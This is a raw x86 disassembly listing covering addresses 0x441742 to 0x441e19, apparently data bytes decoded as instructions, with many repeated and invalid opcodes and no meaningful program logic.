  441742:	inc    DWORD PTR [eax]
  441744:	add    BYTE PTR [ebx],cl
  441746:	inc    DWORD PTR [eax]
  441748:	add    BYTE PTR [ebx],cl
  44174a:	inc    DWORD PTR [eax]
  44174c:	add    BYTE PTR [esi],cl
  44174e:	inc    DWORD PTR [eax]
  441750:	add    BYTE PTR [esi],dl
  441752:	inc    DWORD PTR [eax]
  441754:	add    BYTE PTR [edi],ah
  441756:	inc    DWORD PTR [eax]
  441758:	add    BYTE PTR [edi+edi*8+0x0],al
  44175c:	add    BYTE PTR [ebx-0x2affff01],cl
  441762:	inc    DWORD PTR [edx]
  441764:	add    ebp,ecx
  441766:	jmp    FWORD PTR [ecx]
  441768:	and    eax,0x2c20ff6d
  44176d:	arpl   di,di
  44176f:	adc    dh,BYTE PTR [ecx]
  441771:	(bad)  
  441772:	call   DWORD PTR [edi]
  441774:	xor    al,0xa4
  441776:	call   DWORD PTR ds:0xfff8c29
  44177c:	xor    bl,BYTE PTR [eax-0x79d6fb01]
  441782:	jmp    FWORD PTR [eax]
  441784:	and    eax,0xb0aff4c
  441789:	dec    esi
  44178a:	dec    DWORD PTR [edi]
  44178c:	adc    DWORD PTR [ebp+0x3e1a30ff],edx
  441792:	jmp    FWORD PTR [edx]
  441794:	and    BYTE PTR [edx-0x1],dl
  441797:	push   cs
  441798:	sbb    DWORD PTR [edx-0x26f8fa01],esi
  44179e:	inc    DWORD PTR [eax]
  4417a0:	add    BYTE PTR [esi+0x680000ff],bl
  4417a6:	inc    DWORD PTR [eax]
  4417a8:	add    BYTE PTR ds:0x220000ff,bh
  4417ae:	inc    DWORD PTR [eax]
  4417b0:	add    BYTE PTR [ebx],dl
  4417b2:	inc    DWORD PTR [eax]
  4417b4:	add    BYTE PTR [edi+edi*8],cl
  4417b7:	add    BYTE PTR [eax],al
  4417b9:	or     edi,edi
  4417bb:	add    BYTE PTR [eax],al
  4417bd:	push   cs
  4417be:	inc    DWORD PTR [eax]
  4417c0:	add    BYTE PTR [edi],cl
  4417c2:	inc    DWORD PTR [eax]
  4417c4:	add    BYTE PTR [ebx],dl
  4417c6:	inc    DWORD PTR [eax]
  4417c8:	add    BYTE PTR [edi+edi*8],dl
  4417cb:	add    BYTE PTR [eax],al
  4417cd:	adc    eax,0x1a0000ff
  4417d2:	inc    DWORD PTR [eax]
  4417d4:	add    BYTE PTR [edx],ch
  4417d6:	inc    DWORD PTR [eax]
  4417d8:	add    BYTE PTR [edi],dh
  4417da:	inc    DWORD PTR [eax]
  4417dc:	add    BYTE PTR [ebx-0x1],dl
  4417df:	add    BYTE PTR [eax],al
  4417e1:	jbe    0x4417e2
  4417e3:	add    BYTE PTR [ecx],al
  4417e5:	xchg   edi,eax
  4417e6:	inc    DWORD PTR [eax]
  4417e8:	or     ebp,ecx
  4417ea:	inc    DWORD PTR [eax]
  4417ec:	adc    eax,0x900ffea
  4417f1:	out    dx,eax
  4417f2:	inc    DWORD PTR [eax]
  4417f4:	add    al,ch
  4417f6:	inc    DWORD PTR [edx]
  4417f8:	add    al,ch
  4417fa:	inc    DWORD PTR ds:0xeffb502
  441800:	or     DWORD PTR [edi-0x39fbf801],eax
  441806:	inc    DWORD PTR [eax]
  441808:	add    esp,eax
  44180a:	inc    DWORD PTR ds:0x18ffd613
  441810:	sub    ah,dh
  441812:	inc    DWORD PTR [edx]
  441814:	or     ah,cl
  441816:	inc    DWORD PTR [eax]
  441818:	push   cs
  441819:	(bad)  
  44181b:	add    bl,BYTE PTR [edx]
  44181d:	aam    0xff
  44181f:	add    BYTE PTR [esi],cl
  441821:	fdiv   st(7),st
  441823:	add    BYTE PTR [ecx],al
  441825:	stc    
  441826:	inc    DWORD PTR [ecx]
  441828:	add    ch,dh
  44182a:	inc    DWORD PTR [eax]
  44182c:	add    BYTE PTR [esi-0x1],bh
  44182f:	add    BYTE PTR [eax],al
  441831:	push   ecx
  441832:	inc    DWORD PTR [eax]
  441834:	add    BYTE PTR [edi],ch
  441836:	inc    DWORD PTR [eax]
  441838:	add    BYTE PTR [esi],bl
  44183a:	inc    DWORD PTR [eax]
  44183c:	add    BYTE PTR ds:0x1f0000ff,dl
  441842:	inc    DWORD PTR [eax]
  441844:	add    BYTE PTR [edx],ah
  441846:	inc    DWORD PTR [eax]
  441848:	add    BYTE PTR [edx],bl
  44184a:	inc    DWORD PTR [eax]
  44184c:	add    BYTE PTR [eax],bl
  44184e:	inc    DWORD PTR [eax]
  441850:	add    BYTE PTR [edx],bl
  441852:	inc    DWORD PTR [eax]
  441854:	add    BYTE PTR [ecx],bl
  441856:	inc    DWORD PTR [eax]
  441858:	add    BYTE PTR [ebx],dl
  44185a:	inc    DWORD PTR [eax]
  44185c:	add    BYTE PTR [esi],dl
  44185e:	inc    DWORD PTR [eax]
  441860:	add    BYTE PTR ds:0xb0000ff,dl
  441866:	inc    DWORD PTR [eax]
  441868:	add    BYTE PTR [ebx],ah
  44186a:	inc    DWORD PTR [eax]
  44186c:	add    BYTE PTR [esi],bh
  44186e:	inc    DWORD PTR [eax]
  441870:	add    BYTE PTR [edi-0x1],bl
  441873:	add    BYTE PTR [ecx],al
  441875:	mov    eax,ds:0xed1a00ff
  44187a:	inc    DWORD PTR [edi]
  44187c:	es loope 0x44187e
  44187f:	adc    al,0x1f
  441881:	dec    DWORD PTR [di]
  441884:	adc    edi,DWORD PTR ds:0x3d130eff
  44188a:	dec    DWORD PTR [ebx]
  44188c:	sysexit 
  44188e:	inc    DWORD PTR [edi]
  441890:	or     eax,0x120cff27
  441895:	sub    bh,bh
  441897:	or     edx,DWORD PTR [esp+esi*1]
  44189a:	dec    DWORD PTR [edx*1+0x170eff35]
  4418a1:	and    bh,bh
  4418a3:	or     DWORD PTR [esi],ecx
  4418a5:	cmp    bh,bh
  4418a7:	add    BYTE PTR [eax],al
  4418a9:	into   
  4418aa:	inc    DWORD PTR [eax]
  4418ac:	add    BYTE PTR [edi+edi*8-0xb20000],al
  4418b3:	add    BYTE PTR [eax],al
  4418b5:	xor    edi,edi
  4418b7:	add    BYTE PTR [eax],al
  4418b9:	pop    ss
  4418ba:	inc    DWORD PTR [eax]
  4418bc:	add    BYTE PTR [edx],bl
  4418be:	inc    DWORD PTR [eax]
  4418c0:	add    BYTE PTR [ebx],dl
  4418c2:	inc    DWORD PTR [eax]
  4418c4:	add    BYTE PTR [ebx],dl
  4418c6:	inc    DWORD PTR [eax]
  4418c8:	add    BYTE PTR [edi+edi*8],cl
  4418cb:	add    BYTE PTR [eax],al
  4418cd:	adc    edi,edi
  4418cf:	add    BYTE PTR [eax],al
  4418d1:	adc    bh,bh
  4418d3:	add    BYTE PTR [eax],al
  4418d5:	push   ss
  4418d6:	inc    DWORD PTR [eax]
  4418d8:	add    BYTE PTR [esi],dl
  4418da:	inc    DWORD PTR [eax]
  4418dc:	add    BYTE PTR [ebx],dl
  4418de:	inc    DWORD PTR [eax]
  4418e0:	add    BYTE PTR [eax],dl
  4418e2:	inc    DWORD PTR [eax]
  4418e4:	add    BYTE PTR [ebx],dl
  4418e6:	inc    DWORD PTR [eax]
  4418e8:	add    BYTE PTR [edi+edi*8],ah
  4418eb:	add    BYTE PTR [eax],al
  4418ed:	inc    ebx
  4418ee:	inc    DWORD PTR [eax]
  4418f0:	add    BYTE PTR [ebp-0x1],dh
  4418f3:	add    BYTE PTR ds:0x1410ffc6,al
  4418f9:	ins    DWORD PTR es:[edi],dx
  4418fa:	call   DWORD PTR [ecx]
  4418fc:	sbb    DWORD PTR ds:0x4c0f0bff,edi
  441902:	call   DWORD PTR [eax]
  441904:	adc    eax,DWORD PTR [esi-0x1]
  441907:	or     DWORD PTR [esi],ecx
  441909:	cmp    edi,edi
  44190b:	push   cs
  44190c:	or     eax,0x100eff2b
  441911:	das    
  441912:	call   DWORD PTR [edi]
  441914:	adc    al,0x31
  441916:	jmp    DWORD PTR [ebx]
  441918:	and    al,0x40
  44191a:	call   FWORD PTR [edx]
  44191c:	sbb    BYTE PTR ds:0xc20200ff,ch
  441922:	inc    DWORD PTR [eax]
  441924:	add    bh,bh
  441926:	inc    DWORD PTR [esi+eax*1]
  441929:	mov    cl,0xff
  44192b:	daa    
  44192c:	cmp    cl,BYTE PTR [ebx-0x3d1ea01]
  441932:	inc    DWORD PTR [eax]
  441934:	add    BYTE PTR [edx+0x5e0000ff],dl
  44193a:	inc    DWORD PTR [eax]
  44193c:	add    BYTE PTR [eax],bh
  44193e:	inc    DWORD PTR [eax]
  441940:	add    BYTE PTR [esi],dl
  441942:	inc    DWORD PTR [eax]
  441944:	add    BYTE PTR [esi],al
  441946:	inc    DWORD PTR [eax]
  441948:	add    BYTE PTR [ebx],cl
  44194a:	inc    DWORD PTR [eax]
  44194c:	add    BYTE PTR [esi],cl
  44194e:	inc    DWORD PTR [eax]
  441950:	add    BYTE PTR [edi+edi*8],dl
  441953:	add    BYTE PTR [eax],al
  441955:	sub    bh,bh
  441957:	add    BYTE PTR [eax],al
  441959:	dec    eax
  44195a:	inc    DWORD PTR [eax+edx*1]
  44195d:	xchg   ebx,eax
  44195e:	inc    DWORD PTR [eax]
  441960:	and    ebx,edx
  441962:	inc    DWORD PTR [edx]
  441964:	add    ah,cl
  441966:	jmp    DWORD PTR ds:0x20ff6f23
  44196c:	ds xchg esi,eax
  44196e:	call   DWORD PTR [edi]
  441970:	aas    
  441971:	stos   BYTE PTR es:[edi],al
  441972:	call   DWORD PTR [edi]
  441974:	inc    ecx
  441975:	ret    
  441976:	call   FWORD PTR [eax]
  441978:	aas    
  441979:	scas   eax,DWORD PTR es:[edi]
  44197a:	jmp    FWORD PTR [edx]
  44197c:	inc    esp
  44197d:	xchg   ebp,eax
  44197e:	jmp    FWORD PTR [edx]
  441980:	dec    eax
  441981:	xchg   ebx,eax
  441982:	push   DWORD PTR [esp+edi*1]
  441985:	js     0x441986
  441987:	sbb    ebx,DWORD PTR [edx]
  441989:	imul   edi,edi,0xff880a07
  44198f:	push   ds
  441990:	sbb    BYTE PTR [edi-0x1],ch
  441993:	cmp    ebp,DWORD PTR [ecx]
  441995:	and    bh,bh
  441997:	adc    DWORD PTR [ebx+esi*2],edx
  44199a:	inc    DWORD PTR [eax]
  44199c:	add    edx,edi
  44199e:	inc    DWORD PTR [eax]
  4419a0:	add    BYTE PTR [ebx+0x710000ff],bl
  4419a6:	inc    DWORD PTR [eax]
  4419a8:	add    BYTE PTR [eax-0x1],al
  4419ab:	add    BYTE PTR [eax],al
  4419ad:	and    eax,0x110000ff
  4419b2:	inc    DWORD PTR [eax]
  4419b4:	add    BYTE PTR [edi],cl
  4419b6:	inc    DWORD PTR [eax]
  4419b8:	add    BYTE PTR [edx],dl
  4419ba:	inc    DWORD PTR [eax]
  4419bc:	add    BYTE PTR [edx],dl
  4419be:	inc    DWORD PTR [eax]
  4419c0:	add    BYTE PTR [edi+edi*8],cl
  4419c3:	add    BYTE PTR [eax],al
  4419c5:	adc    bh,bh
  4419c7:	add    BYTE PTR [eax],al
  4419c9:	or     bh,bh
  4419cb:	add    BYTE PTR [eax],al
  4419cd:	or     eax,0xe0000ff
  4419d2:	inc    DWORD PTR [eax]
  4419d4:	add    BYTE PTR [ebx],bl
  4419d6:	inc    DWORD PTR [eax]
  4419d8:	add    BYTE PTR [edi],bl
  4419da:	inc    DWORD PTR [eax]
  4419dc:	add    BYTE PTR [edi],dh
  4419de:	inc    DWORD PTR [eax]
  4419e0:	add    BYTE PTR [esi-0x1],cl
  4419e3:	add    BYTE PTR [eax],al
  4419e5:	inc    DWORD PTR gs:[eax]
  4419e8:	add    BYTE PTR [eax-0x6efdff01],al
  4419ee:	inc    DWORD PTR [eax]
  4419f0:	or     esi,DWORD PTR [eax-0x39edfe01]
  4419f6:	inc    DWORD PTR [ebx]
  4419f8:	push   ss
  4419f9:	int    0xff
  4419fb:	add    BYTE PTR ds:0xb00ffcc,cl
  441a01:	retf   
  441a02:	inc    DWORD PTR [eax]
  441a04:	or     eax,0x200ffce
  441a09:	aad    0xff
  441a0b:	add    BYTE PTR [ebx],cl
  441a0d:	sar    edi,cl
  441a0f:	add    BYTE PTR [ecx],cl
  441a11:	aam    0xff
  441a13:	add    al,BYTE PTR [ecx]
  441a15:	out    0xff,eax
  441a17:	add    eax,DWORD PTR [edi+eiz*8]
  441a1a:	inc    DWORD PTR [ebx]
  441a1c:	push   es
  441a1d:	(bad)  
  441a1f:	add    eax,DWORD PTR [ecx+ebx*8]
  441a22:	inc    DWORD PTR [ecx]
  441a24:	add    al,0xcc
  441a26:	inc    DWORD PTR [ecx]
  441a28:	add    esi,DWORD PTR [edx+0x650000ff]
  441a2e:	inc    DWORD PTR [eax]
  441a30:	add    BYTE PTR [eax-0x1],al
  441a33:	add    BYTE PTR [eax],al
  441a35:	sub    edi,edi
  441a37:	add    BYTE PTR [eax],al
  441a39:	sbb    edi,edi
  441a3b:	add    BYTE PTR [eax],al
  441a3d:	adc    al,0xff
  441a3f:	add    BYTE PTR [eax],al
  441a41:	adc    al,0xff
  441a43:	add    BYTE PTR [eax],al
  441a45:	adc    bh,bh
  441a47:	add    BYTE PTR [eax],al
  441a49:	adc    edi,edi
  441a4b:	add    BYTE PTR [eax],al
  441a4d:	sbb    edi,edi
  441a4f:	add    BYTE PTR [eax],al
  441a51:	sbb    edi,edi
  441a53:	add    BYTE PTR [eax],al
  441a55:	sbb    bh,bh
  441a57:	add    BYTE PTR [eax],al
  441a59:	sbb    edi,edi
  441a5b:	add    BYTE PTR [eax],al
  441a5d:	sbb    edi,edi
  441a5f:	add    BYTE PTR [eax],al
  441a61:	pop    ss
  441a62:	inc    DWORD PTR [eax]
  441a64:	add    BYTE PTR [eax],dl
  441a66:	inc    DWORD PTR [eax]
  441a68:	add    BYTE PTR [ebx],ah
  441a6a:	inc    DWORD PTR [eax]
  441a6c:	add    BYTE PTR [edi+edi*8],bh
  441a6f:	add    BYTE PTR [eax],al
  441a71:	(bad)  
  441a72:	inc    DWORD PTR [eax]
  441a74:	add    DWORD PTR [esi-0x21e6fe01],ebx
  441a7a:	inc    DWORD PTR [edi]
  441a7c:	and    esi,esp
  441a7e:	jmp    DWORD PTR [edx]
  441a80:	inc    eax
  441a81:	popf   
  441a82:	dec    DWORD PTR [edx]
  441a84:	adc    al,0x39
  441a86:	dec    DWORD PTR [edi+edx*1]
  441a89:	cmp    eax,0x481e1aff
  441a8e:	call   DWORD PTR [eax+ebx*1]
  441a91:	cmp    bh,bh
  441a93:	or     DWORD PTR [eax+ebp*1],ecx
  441a96:	inc    DWORD PTR [edi]
  441a98:	or     esi,DWORD PTR [eax]
  441a9a:	dec    DWORD PTR [ebx]
  441a9c:	adc    dh,BYTE PTR [edi+edi*8]
  441a9f:	or     edx,DWORD PTR [ecx]
  441aa1:	call   DWORD PTR es:[edx]
  441aa4:	push   ds
  441aa5:	and    bh,bh
  441aa7:	add    DWORD PTR [edx],eax
  441aa9:	(bad)  
  441aaa:	inc    DWORD PTR [eax]
  441aac:	add    BYTE PTR [edi+edi*8-0xac0000],cl
  441ab3:	add    BYTE PTR [eax],al
  441ab5:	xor    edi,edi
  441ab7:	add    BYTE PTR [eax],al
  441ab9:	sbb    edi,edi
  441abb:	add    BYTE PTR [eax],al
  441abd:	push   ss
  441abe:	inc    DWORD PTR [eax]
  441ac0:	add    BYTE PTR ds:0x110000ff,cl
  441ac6:	inc    DWORD PTR [eax]
  441ac8:	add    BYTE PTR [edi+edi*8],cl
  441acb:	add    BYTE PTR [eax],al
  441acd:	push   cs
  441ace:	inc    DWORD PTR [eax]
  441ad0:	add    BYTE PTR [esi],cl
  441ad2:	inc    DWORD PTR [eax]
  441ad4:	add    BYTE PTR [edx],dl
  441ad6:	inc    DWORD PTR [eax]
  441ad8:	add    BYTE PTR ds:0xb0000ff,dl
  441ade:	inc    DWORD PTR [eax]
  441ae0:	add    BYTE PTR [edi],cl
  441ae2:	inc    DWORD PTR [eax]
  441ae4:	add    BYTE PTR [ebx],dl
  441ae6:	inc    DWORD PTR [eax]
  441ae8:	add    BYTE PTR [edx],ah
  441aea:	inc    DWORD PTR [eax]
  441aec:	add    BYTE PTR [ebx-0x1],al
  441aef:	add    BYTE PTR [eax],al
  441af1:	jae    0x441af2
  441af3:	add    BYTE PTR ds:0x1a12ffc3,al
  441af9:	imul   edi,edi,0xff2f1612
  441aff:	or     edx,DWORD PTR [edx]
  441b01:	push   eax
  441b02:	dec    DWORD PTR [esi]
  441b04:	adc    eax,DWORD PTR [ebx-0x1]
  441b07:	or     cl,BYTE PTR ds:0x90aff36
  441b0d:	dec    DWORD PTR es:[ebx]
  441b10:	or     ebp,DWORD PTR [esi]
  441b12:	dec    DWORD PTR ds:0x1bff2a0d
  441b18:	sbb    dh,BYTE PTR [ebx]
  441b1a:	jmp    FWORD PTR [edx]
  441b1c:	daa    
  441b1d:	xor    eax,0x750808ff
  441b22:	inc    DWORD PTR [eax]
  441b24:	add    eax,0xffe1
  441b29:	out    0xff,eax
  441b2b:	and    esi,DWORD PTR [esi]
  441b2d:	test   al,0xff
  441b2f:	adc    al,0x29
  441b31:	sti    
  441b32:	inc    DWORD PTR [eax]
  441b34:	add    BYTE PTR [esi+0x5a0000ff],cl
  441b3a:	inc    DWORD PTR [eax]
  441b3c:	add    BYTE PTR [edx],dh
  441b3e:	inc    DWORD PTR [eax]
  441b40:	add    BYTE PTR [edi+edi*8],dl
  441b43:	add    BYTE PTR [eax],al
  441b45:	or     edi,edi
  441b47:	add    BYTE PTR [eax],al
  441b49:	or     bh,bh
  441b4b:	add    BYTE PTR [eax],al
  441b4d:	adc    al,0xff
  441b4f:	add    BYTE PTR [eax],al
  441b51:	and    bh,bh
  441b53:	add    BYTE PTR [eax],al
  441b55:	sub    edi,edi
  441b57:	add    BYTE PTR [eax],al
  441b59:	dec    esp
  441b5a:	inc    DWORD PTR [eax]
  441b5c:	add    BYTE PTR [edi-0x1],bh
  441b5f:	add    BYTE PTR ds:0x101ffbc,al
  441b65:	sar    bh,1
  441b67:	sbb    al,0x18
  441b69:	popa   
  441b6a:	jmp    DWORD PTR [ebx]
  441b6c:	xor    DWORD PTR [edi-0x1],ebp
  441b6f:	or     al,0x1c
  441b71:	test   edi,edi
  441b73:	or     bl,BYTE PTR [eax]
  441b75:	mov    edi,edi
  441b77:	add    eax,0x11ffc01c
  441b7c:	aaa    
  441b7d:	mov    edi,0xa54313ff
  441b82:	jmp    FWORD PTR ds:0x30ff7e3e
  441b88:	xor    al,0x70
  441b8a:	call   DWORD PTR [ebx]
  441b8c:	adc    al,0x7c
  441b8e:	inc    DWORD PTR [eax]
  441b90:	add    esi,DWORD PTR [edi+edi*8-0x82d5d0]
  441b97:	ss sub al,0x39
  441b9a:	dec    DWORD PTR [esp+ecx*1]
  441b9d:	xlat   BYTE PTR ds:[ebx]
  441b9e:	inc    DWORD PTR [eax]
  441ba0:	add    BYTE PTR [ebx+0x7b0000ff],cl
  441ba6:	inc    DWORD PTR [eax]
  441ba8:	add    BYTE PTR [edi-0x1],al
  441bab:	add    BYTE PTR [eax],al
  441bad:	daa    
  441bae:	inc    DWORD PTR [eax]
  441bb0:	add    BYTE PTR [ebx],dl
  441bb2:	inc    DWORD PTR [eax]
  441bb4:	add    BYTE PTR [ecx],cl
  441bb6:	inc    DWORD PTR [eax]
  441bb8:	add    BYTE PTR [eax],dl
  441bba:	inc    DWORD PTR [eax]
  441bbc:	add    BYTE PTR [edi],cl
  441bbe:	inc    DWORD PTR [eax]
  441bc0:	add    BYTE PTR [edi+edi*8],cl
  441bc3:	add    BYTE PTR [eax],al
  441bc5:	adc    edi,edi
  441bc7:	add    BYTE PTR [eax],al
  441bc9:	or     al,0xff
  441bcb:	add    BYTE PTR [eax],al
  441bcd:	push   cs
  441bce:	inc    DWORD PTR [eax]
  441bd0:	add    BYTE PTR ds:0x140000ff,cl
  441bd6:	inc    DWORD PTR [eax]
  441bd8:	add    BYTE PTR [esi],dl
  441bda:	inc    DWORD PTR [eax]
  441bdc:	add    BYTE PTR [ebx],ah
  441bde:	inc    DWORD PTR [eax]
  441be0:	add    BYTE PTR ds:0x3f0000ff,ch
  441be6:	inc    DWORD PTR [eax]
  441be8:	add    BYTE PTR [eax-0x1],dl
  441beb:	add    BYTE PTR [eax],al
  441bed:	(bad)  
  441bee:	inc    DWORD PTR [eax]
  441bf0:	add    BYTE PTR [eax-0x1],dh
  441bf3:	add    BYTE PTR [eax],al
  441bf5:	jns    0x441bf6
  441bf7:	add    BYTE PTR [eax],al
  441bf9:	jg     0x441bfa
  441bfb:	add    BYTE PTR [eax],al
  441bfd:	test   bh,bh
  441bff:	add    BYTE PTR [eax],al
  441c01:	cmp    edi,0x0
  441c04:	add    BYTE PTR [ebp-0x79ffff01],al
  441c0a:	inc    DWORD PTR [eax]
  441c0c:	add    BYTE PTR [ecx-0x79ffff01],cl
  441c12:	inc    DWORD PTR [eax]
  441c14:	add    BYTE PTR [esi-0x7bffff01],al
  441c1a:	inc    DWORD PTR [eax]
  441c1c:	add    BYTE PTR [edi-0x1],bh
  441c1f:	add    BYTE PTR [eax],al
  441c21:	jbe    0x441c22
  441c23:	add    BYTE PTR [eax],al
  441c25:	imul   edi,edi,0xff560000
  441c2b:	add    BYTE PTR [eax],al
  441c2d:	inc    ebx
  441c2e:	inc    DWORD PTR [eax]
  441c30:	add    BYTE PTR [ebx],dh
  441c32:	inc    DWORD PTR [eax]
  441c34:	add    BYTE PTR [esi],ah
  441c36:	inc    DWORD PTR [eax]
  441c38:	add    BYTE PTR [ebx],bl
  441c3a:	inc    DWORD PTR [eax]
  441c3c:	add    BYTE PTR [ecx],bl
  441c3e:	inc    DWORD PTR [eax]
  441c40:	add    BYTE PTR [edi+edi*8],bl
  441c43:	add    BYTE PTR [eax],al
  441c45:	sbb    edi,edi
  441c47:	add    BYTE PTR [eax],al
  441c49:	adc    bh,bh
  441c4b:	add    BYTE PTR [eax],al
  441c4d:	adc    edi,edi
  441c4f:	add    BYTE PTR [eax],al
  441c51:	sbb    bh,bh
  441c53:	add    BYTE PTR [eax],al
  441c55:	adc    eax,0x110000ff
  441c5a:	inc    DWORD PTR [eax]
  441c5c:	add    BYTE PTR [ebx],dl
  441c5e:	inc    DWORD PTR [eax]
  441c60:	add    BYTE PTR [edi+edi*8],dl
  441c63:	add    BYTE PTR [eax],al
  441c65:	adc    eax,0x260000ff
  441c6a:	inc    DWORD PTR [eax]
  441c6c:	add    BYTE PTR [edi+edi*8],bh
  441c6f:	add    BYTE PTR [eax],al
  441c71:	inc    DWORD PTR gs:[eax]
  441c74:	add    ah,BYTE PTR [ebp-0xad8fc01]
  441c7a:	inc    DWORD PTR [eax+ebx*1]
  441c7d:	sar    edi,cl
  441c7f:	mov    cr2,esi
  441c82:	dec    DWORD PTR [ebx]
  441c84:	sbb    dl,BYTE PTR [ebp-0x1]
  441c87:	or     al,0x15
  441c89:	notrack call DWORD PTR [edi]
  441c8c:	and    BYTE PTR [ecx-0x1],dl
  441c8f:	or     al,0x11
  441c91:	xor    bh,bh
  441c93:	adc    al,0x16
  441c95:	xor    al,0xff
  441c97:	add    eax,0x8ff1705
  441c9c:	adc    DWORD PTR [edi+edi*8],esi
  441c9f:	or     al,0x12
  441ca1:	sub    bh,bh
  441ca3:	or     eax,0x1ff1d16
  441ca8:	add    ebp,edx
  441caa:	inc    DWORD PTR [eax]
  441cac:	add    BYTE PTR [ecx+0x650000ff],bl
  441cb2:	inc    DWORD PTR [eax]
  441cb4:	add    BYTE PTR [edi],dh
  441cb6:	inc    DWORD PTR [eax]
  441cb8:	add    BYTE PTR [edx],ah
  441cba:	inc    DWORD PTR [eax]
  441cbc:	add    BYTE PTR [edi],dl
  441cbe:	inc    DWORD PTR [eax]
  441cc0:	add    BYTE PTR [edi+edi*8],cl
  441cc3:	add    BYTE PTR [eax],al
  441cc5:	adc    bh,bh
  441cc7:	add    BYTE PTR [eax],al
  441cc9:	adc    bh,bh
  441ccb:	add    BYTE PTR [eax],al
  441ccd:	adc    edi,edi
  441ccf:	add    BYTE PTR [eax],al
  441cd1:	adc    bh,bh
  441cd3:	add    BYTE PTR [eax],al
  441cd5:	adc    al,0xff
  441cd7:	add    BYTE PTR [eax],al
  441cd9:	or     al,0xff
  441cdb:	add    BYTE PTR [eax],al
  441cdd:	ud0    eax,DWORD PTR [eax]
  441ce0:	add    BYTE PTR ds:0xf0000ff,cl
  441ce6:	inc    DWORD PTR [eax]
  441ce8:	add    BYTE PTR [edi],bl
  441cea:	inc    DWORD PTR [eax]
  441cec:	add    BYTE PTR [ebx-0x1],al
  441cef:	add    BYTE PTR [eax],al
  441cf1:	jno    0x441cf2
  441cf3:	add    BYTE PTR [esi],al
  441cf5:	(bad)  
  441cf8:	jge    0x375d2ffd
  441cfe:	inc    DWORD PTR ds:0x4ff3b0d
  441d04:	push   es
  441d05:	and    eax,0x370f0dff
  441d0a:	dec    DWORD PTR [esi]
  441d0c:	or     eax,0xc0aff28
  441d11:	and    eax,0x230a07ff
  441d16:	call   FWORD PTR [ecx]
  441d18:	sbb    dl,BYTE PTR [edx-0x1]
  441d1b:	sub    eax,0x1dff2927
  441d20:	adc    eax,0x200ff56
  441d25:	icebp  
  441d26:	inc    DWORD PTR [eax]
  441d28:	add    eax,edi
  441d2a:	inc    DWORD PTR [esi+eax*1]
  441d2d:	(bad)  
  441d30:	sub    eax,0xfffb
  441d35:	cmp    bh,0x0
  441d38:	add    BYTE PTR [eax-0x1],dl
  441d3b:	add    BYTE PTR [eax],al
  441d3d:	inc    DWORD PTR cs:[eax]
  441d40:	add    BYTE PTR [esi],dl
  441d42:	inc    DWORD PTR [eax]
  441d44:	add    BYTE PTR [eax],cl
  441d46:	inc    DWORD PTR [eax]
  441d48:	add    BYTE PTR [esi],al
  441d4a:	inc    DWORD PTR [eax]
  441d4c:	add    BYTE PTR [edi],cl
  441d4e:	inc    DWORD PTR [eax]
  441d50:	add    BYTE PTR [ebx],bl
  441d52:	inc    DWORD PTR [eax]
  441d54:	add    BYTE PTR [edx],dh
  441d56:	inc    DWORD PTR [eax]
  441d58:	add    BYTE PTR [edi-0x1],dl
  441d5b:	add    BYTE PTR [eax],al
  441d5d:	mov    edi,edi
  441d5f:	add    BYTE PTR [eax],al
  441d61:	sar    bh,0x2
  441d64:	add    ecx,esp
  441d66:	call   FWORD PTR [ebx+ebx*1]
  441d69:	xchg   ecx,eax
  441d6a:	call   FWORD PTR [ebx]
  441d6c:	daa    
  441d6d:	push   0x5b190eff
  441d72:	dec    DWORD PTR [edi]
  441d74:	adc    al,0x4a
  441d76:	inc    DWORD PTR [eax]
  441d78:	or     BYTE PTR [eax-0x1],dh
  441d7b:	add    BYTE PTR [ecx],ah
  441d7d:	lods   al,BYTE PTR ds:[esi]
  441d7e:	dec    DWORD PTR [esi+esi*1]
  441d81:	fwait
  441d82:	jmp    FWORD PTR [ecx]
  441d84:	aaa    
  441d85:	outs   dx,DWORD PTR ds:[esi]
  441d86:	jmp    FWORD PTR [ebx]
  441d88:	xor    ebp,DWORD PTR [eax-0x1]
  441d8b:	daa    
  441d8c:	sub    DWORD PTR [edi+edi*8+0x1],esp
  441d90:	add    al,0x91
  441d92:	inc    DWORD PTR [ebx]
  441d94:	or     ebx,eax
  441d96:	push   DWORD PTR [edx]
  441d98:	sub    DWORD PTR [edx-0x1],esp
  441d9b:	and    BYTE PTR [eax],bl
  441d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441d9e:	inc    DWORD PTR [eax]
  441da0:	add    ah,cl
  441da2:	inc    DWORD PTR [eax]
  441da4:	add    BYTE PTR [ebx+0x510000ff],al
  441daa:	inc    DWORD PTR [eax]
  441dac:	add    BYTE PTR ds:0x170000ff,ch
  441db2:	inc    DWORD PTR [eax]
  441db4:	add    BYTE PTR [edi+edi*8],cl
  441db7:	add    BYTE PTR [eax],al
  441db9:	push   cs
  441dba:	inc    DWORD PTR [eax]
  441dbc:	add    BYTE PTR [ecx],cl
  441dbe:	inc    DWORD PTR [eax]
  441dc0:	add    BYTE PTR [eax],cl
  441dc2:	inc    DWORD PTR [eax]
  441dc4:	add    BYTE PTR [ecx],dl
  441dc6:	inc    DWORD PTR [eax]
  441dc8:	add    BYTE PTR [eax],dl
  441dca:	inc    DWORD PTR [eax]
  441dcc:	add    BYTE PTR [edi],cl
  441dce:	inc    DWORD PTR [eax]
  441dd0:	add    BYTE PTR [edi],cl
  441dd2:	inc    DWORD PTR [eax]
  441dd4:	add    BYTE PTR ds:0xd0000ff,cl
  441dda:	inc    DWORD PTR [eax]
  441ddc:	add    BYTE PTR [ebx],dl
  441dde:	inc    DWORD PTR [eax]
  441de0:	add    BYTE PTR [edi],dl
  441de2:	inc    DWORD PTR [eax]
  441de4:	add    BYTE PTR ds:0x2e0000ff,ah
  441dea:	inc    DWORD PTR [eax]
  441dec:	add    BYTE PTR [edi],dh
  441dee:	inc    DWORD PTR [eax]
  441df0:	add    BYTE PTR [edi+edi*8+0x0],al
  441df4:	add    BYTE PTR [ecx-0x1],cl
  441df7:	add    BYTE PTR [eax],al
  441df9:	push   eax
  441dfa:	inc    DWORD PTR [eax]
  441dfc:	add    BYTE PTR [ecx-0x1],dl
  441dff:	add    BYTE PTR [eax],al
  441e01:	push   esi
  441e02:	inc    DWORD PTR [eax]
  441e04:	add    BYTE PTR [ebx-0x1],dl
  441e07:	add    BYTE PTR [eax],al
  441e09:	push   esi
  441e0a:	inc    DWORD PTR [eax]
  441e0c:	add    BYTE PTR [ebx-0x1],dl
  441e0f:	add    BYTE PTR [eax],al
  441e11:	push   esp
  441e12:	inc    DWORD PTR [eax]
  441e14:	add    BYTE PTR [esi-0x1],dl
  441e17:	add    BYTE PTR [eax],al
  441e19:	push   esp
